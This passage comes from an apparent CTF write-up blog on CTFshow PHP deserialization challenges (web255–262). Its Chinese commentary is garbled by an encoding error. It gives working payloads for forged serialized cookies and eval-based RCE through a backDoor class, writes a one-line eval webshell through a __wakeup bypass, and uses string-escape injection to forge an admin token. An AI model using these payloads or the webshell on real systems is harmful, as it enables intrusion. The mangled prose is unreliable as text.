            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
        &#125;
    &#125;<span class="keyword">else</span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
    &#125;
&#125;</code></pre>

<p>ä¸å¸®ä½ åˆ›ï¼Œè®©ä½ è‡ªå·±æä¸€æï¼Œåºåˆ—åŒ–å…¥é—¨è¯´æ˜¯</p>
<pre><code class="highlight plaintext">&lt;?php
class ctfShowUser&#123;
    public $username=&#x27;1&#x27;;
    public $password=&#x27;1&#x27;;
    public $isVip=true;
&#125;
$A=new ctfShowUser();
echo serialize($A);</code></pre>

<p>å‘ç°ä¼ ä¸è¿›å»ï¼Œä¸€æŸ¥å‘ç°<strong>Cookieä¸­å°†â€ä½œä¸ºæˆªæ–­ç¬¦å·</strong></p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250710161829381.png" alt="image-20250710161829381"></p>
<p>æ„Ÿè§‰åˆ†å·ä¹Ÿä¸æ˜¯å¾ˆå‹å¥½å•Šã€‚<code>urlç¼–ç æ•´ä¸€ä¸ª</code></p>
<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);

<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;
            <span class="keyword">global</span> <span class="variable">$flag</span>;
            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;
                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;
              &#125;
        &#125;<span class="keyword">else</span>&#123;
            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
        &#125;
    &#125;
&#125;

<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    
    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;
        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;
            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
        &#125;
    &#125;<span class="keyword">else</span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
    &#125;
&#125;</code></pre>

<p>æ¯”ä¸Šä¸€é¢˜å¤šäº†ä¸ª<code>username!=passwd</code></p>
<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
<span class="class">    &#125;</span>
<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
<span class="class">    &#125;</span>
<span class="class">&#125;</span>
<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
    &#125;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$code</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
    &#125;
&#125;
<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);
    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);
&#125;</code></pre>

<p>è¿™é‡Œçœ‹ä¸Šéƒ¨åˆ†å³å¯</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
<span class="class">    &#125;</span>
<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
<span class="class">    &#125;</span>
<span class="class">&#125;</span>
<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
    &#125;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$code</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
    &#125;
&#125;</code></pre>

<p>ç›´æ¥åˆ©ç”¨<code>backDoor</code>ç±»æ¥RCE</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=True;
    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;&#x27;</span>;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;
&#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();
<span class="variable">$a</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span>
<span class="class"><span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>($<span class="title">a</span>));</span></code></pre>

<p>æˆåŠŸæ‰§è¡Œ</p>
<h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
<span class="class">    &#125;</span>
<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
<span class="class">    &#125;</span>
<span class="class"></span>
<span class="class">&#125;</span>
<span class="class"></span>
<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
    &#125;
&#125;

<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$code</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
    &#125;
&#125;

<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;
        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);
    &#125;
    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);
&#125;</code></pre>

<p>Cookieä¸å…è®¸O&#x2F;Cå¼€å¤´ï¼Œåé¢ä¸å‡†æ¥æ•°å­—</p>
<h3 id="web259-open"><a href="#web259-open" class="headerlink" title="web259(open)"></a>web259(open)</h3><pre><code class="highlight plaintext">
$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);
array_pop($xff);
$ip = array_pop($xff);
if($ip!==&#x27;127.0.0.1&#x27;)&#123;
	die(&#x27;error&#x27;);
&#125;else&#123;
	$token = $_POST[&#x27;token&#x27;];
	if($token==&#x27;ctfshow&#x27;)&#123;
		file_put_contents(&#x27;flag.txt&#x27;,$flag);
	&#125;
&#125;</code></pre>

<h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);

<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;
    <span class="keyword">echo</span> <span class="variable">$flag</span>;
&#125;</code></pre>

<p>æœ¬æ¥åœ¨æƒ³æ˜¯ä¸æ˜¯è¦ç”¨åŸç”Ÿç±»çš„ï¼Œä½†æ˜¯å‘ç°å¥½åƒæ˜¯æ€é¸¡ç”¨ç‰›åˆ€ï¼Œè¿˜æ˜¯å¯¹ååºåˆ—åŒ–è¿™è¾¹æœ‰ä¸€äº›åæ‰§çš„å›ºæœ‰å°è±¡å•Šã€‚ã€‚</p>
<p>å¸Œæœ›åé¢èƒ½æ¶ˆé™¤è¿™ç§åè§ã€‚</p>
<p>è¿™é‡Œç›´æ¥åºåˆ—åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å³å¯</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span>=<span class="string">&#x27;ctfshow_i_love_36D&#x27;</span>;
<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</code></pre>

<h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

<span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>;
    <span class="keyword">public</span> <span class="variable">$code</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;
        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;
            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);
        &#125;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
    &#125;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;
        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];
        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];
        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;
            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);
        &#125;
    &#125;
&#125;

<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</code></pre>

<p>å‡ ä¸ªåˆ›å»ºæ—¶å€™è°ƒç”¨çš„é­”æœ¯æ–¹æ³•å¯ä»¥ç›´æ¥ä¸çœ‹äº†ã€‚ã€‚</p>
<p>è¿™é‡Œäº†è§£åˆ°äº†ä»7.4.0å¼€å§‹ï¼Œå¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† <code>__unserialize() å’Œ __wakeup()</code> ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰ <code>__unserialize()</code> æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ__wakeup() æ–¹æ³•ä¼šè¢«å¿½ç•¥ï¼Œé‚£ä¹ˆç›´æ¥è§¦å‘æ–‡ä»¶å†™å…¥å†™é©¬å³å¯</p>
<p>ç»“åˆ<code>__unserialize</code>å†…çš„ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºè¿™è¾¹æ˜¯ä¸€ä¸ªå¼±æ¯”è¾ƒ</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;877.php&#x27;</span>;<span class="comment">//å¼±æ¯”è¾ƒ</span>
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;&#x27;</span>;
&#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>();
<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</code></pre>

<p>æœ€åèšå‰‘å³å¯</p>
<h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
    <span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span>
<span class="comment"># <span class="doctag">@message</span>.php</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$from</span>;
    <span class="keyword">public</span> <span class="variable">$msg</span>;
    <span class="keyword">public</span> <span class="variable">$to</span>;
    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;
        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;
        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;
    &#125;
&#125;

<span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];
<span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];
<span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;
    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);
    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));
    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));
    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;
&#125;

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre>

<p>ä¸€çœ¼å­—ç¬¦ä¸²é€ƒé€¸</p>
<p>ä½†æ˜¯ä¼ å®Œcookieå¹²ä»€ä¹ˆå‘¢ã€‚ã€‚çŒœæµ‹æ˜¯è¦é€ƒé€¸userä¸ºamdinï¼Œé‚£å°±æ‰«ä¸€ä¸‹æœ‰æ²¡æœ‰å…¶ä»–çš„phpæ–‡ä»¶å­˜åœ¨å“ˆ,å°±æ‰«å‡ºæ¥ä¸€ä¸ª<code>flag.php</code></p>
<p>åæ¥æ ¹æ®å…¶ä»–å¸ˆå‚…çš„wpæ‰å‘ç°æ³¨é‡Šé‡Œæœ‰ä¸€ä¸ª<code>message.php</code>ï¼Œçœ¼çé¢†åŸŸå¤§ç¥å‘åŠ›äº†å˜»å˜»</p>
<p>çœ‹ä¸€çœ¼<code>message.php</code></p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);

<span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$from</span>;
    <span class="keyword">public</span> <span class="variable">$msg</span>;
    <span class="keyword">public</span> <span class="variable">$to</span>;
    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;
        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;
        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;
    &#125;
&#125;

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;
    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));
    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;
        <span class="keyword">echo</span> <span class="variable">$flag</span>;
    &#125;
&#125;</code></pre>

<p>æ‰€ä»¥è¿™è¾¹æ„é€ ä¸€ä¸‹åœ¨è®¿é—®message.phpå°±å¯ä»¥è¿‡äº†</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$from</span>=<span class="string">&#x27;1&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$msg</span>=<span class="string">&#x27;2&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$to</span>=<span class="string">&#x27;&quot;;s:5:&quot;token&quot;;s:4:&quot;admin&quot;;&#125;&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;
    &#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">message</span>();
<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
<span class="comment">//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:27:&quot;&quot;;s:5:&quot;token&quot;;s:4:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span></code></pre>

<p>è¿™è¾¹åè¾¹æ˜¯27ä¸ªå­—ç¬¦ï¼Œé‚£å°±è¦27ä¸ªå¤šå‡ºæ¥çš„å­—ç¬¦æ¥ä¿è¯åé¢çš„å­—ç¬¦é€ƒé€¸æ‰ï¼Œåˆšå¥½æ›¿æ¢åæ¯ä¸ªå¤š1ä½ï¼Œé‚£ä¹ˆå°±æ„é€ 27ä¸ª<code>fuck</code>å°±å¯</p>
<pre><code class="highlight plaintext">f=1&amp;m=2&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre>

<p>å¸¸è§„çš„æ‰“å®Œçœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥æ‰“<code>message.php</code>ï¼Œæ¯•ç«Ÿå°±ä¼ ä¸ªcookieçš„äº‹æƒ…</p>
<p>æ‹¿åˆ°åŸCookie<code>O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:1:&quot;2&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></p>
<p>ç›´æ¥æ”¹</p>
<pre><code class="highlight plaintext">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:1:&quot;2&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre>

<p>base64åŠ å¯†åå¾—åˆ°</p>
